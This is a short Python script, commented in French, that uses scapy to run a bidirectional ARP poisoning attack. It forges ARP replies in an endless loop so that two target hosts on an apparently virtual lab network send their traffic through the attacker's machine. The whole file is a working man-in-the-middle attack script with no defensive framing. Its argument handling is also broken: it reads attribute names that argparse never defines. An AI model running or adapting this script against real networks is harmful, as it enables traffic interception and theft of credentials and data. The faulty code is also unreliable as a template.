from scapy.all import *
import argparse

# Valeurs par défaut
default_my_MAC = "52:54:00:2d:8b:c8"
default_target1_IP = "10.1.1.101"
default_target1_MAC = "52:54:00:7b:ae:9d"
default_target2_IP = "10.1.1.253"
default_target2_MAC = "52:54:00:ad:a7:59"

# Configuration de l'analyseur d'arguments
parser = argparse.ArgumentParser(description="Script avec des variables configurables.")
parser.add_argument('--my-MAC', type=str, default=default_my_MAC, help="Votre adresse MAC (par défaut: 52:54:00:2d:8b:c8)")
parser.add_argument('--target1-IP', type=str, default=default_target1_IP, help="Adresse IP cible numéro 1 (par défaut: 10.1.1.101)")
parser.add_argument('--target1-MAC', type=str, default=default_target1_MAC, help="Adresse MAC cible numéro 1 (par défaut: 52:54:00:7b:ae:9d)")
parser.add_argument('--target2-IP', type=str, default=default_target2_IP, help="Adresse IP cible numéro 2 (par défaut: 10.1.1.253)")
parser.add_argument('--target2-MAC', type=str, default=default_target2_MAC, help="Adresse MAC cible numéro 2 (par défaut: 52:54:00:ad:a7:59)")

# Analyse des arguments de la ligne de commande
args = parser.parse_args()

# Utilisation des valeurs fournies ou des valeurs par défaut
my_MAC = args.default_my_MAC
target1_IP = args.default_target1_IP
target1_MAC = args.default_target1_MAC
target2_IP = args.default_target2_IP
target2_MAC = args.default_target2_MAC


#conf.iface = 'virbr1' # !!sur le PC!! Car sinon il balance les trames dans la mauvaise interface :)

def craft_poisoning_arp(my_MAC, target_IP, target_MAC,spoofed_IP):
    frame = Ether(src=my_MAC, dst=target_MAC)
    arp = ARP(op=2, psrc=spoofed_IP,hwsrc=my_MAC, pdst=target_IP, hwdst=target_MAC)
    return frame/arp

arp_poisoning_frame_target1 = craft_poisoning_arp(my_MAC, target1_IP, target1_MAC,target2_IP)
arp_poisoning_frame_target2 = craft_poisoning_arp(my_MAC, target2_IP, target2_MAC,target1_IP)

while True:
    sendp(arp_poisoning_frame_target1, verbose=False)
    sendp(arp_poisoning_frame_target2, verbose=False)